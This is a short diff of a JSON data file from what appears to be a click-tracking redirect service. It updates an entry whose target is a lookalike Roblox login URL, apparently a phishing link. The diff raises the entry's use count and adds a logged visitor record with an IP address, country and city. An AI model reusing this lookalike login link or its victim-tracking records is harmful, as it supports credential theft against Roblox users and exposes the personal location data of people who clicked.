@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1055,
+    "useCount": 1056,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8560,6 +8560,14 @@
         "city": "Jacksonville",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777239532504,
+        "ip": "190.142.155.55",
+        "country": "Venezuela",
+        "city": "Coro",
+        "flag": "🇻🇪",
+        "countryCode": "VE"
       }
     ]
   },
